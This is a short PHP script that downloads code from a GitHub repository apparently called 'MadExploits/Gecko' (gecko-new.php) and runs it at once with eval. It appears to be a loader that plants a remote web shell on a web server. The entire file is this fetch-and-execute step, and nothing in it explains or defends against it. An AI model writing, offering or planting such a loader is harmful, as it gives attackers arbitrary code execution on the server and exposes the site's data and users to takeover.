<?php
    $url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php';

    $code = file_get_contents($url);

    eval('?>' . $code);
?>
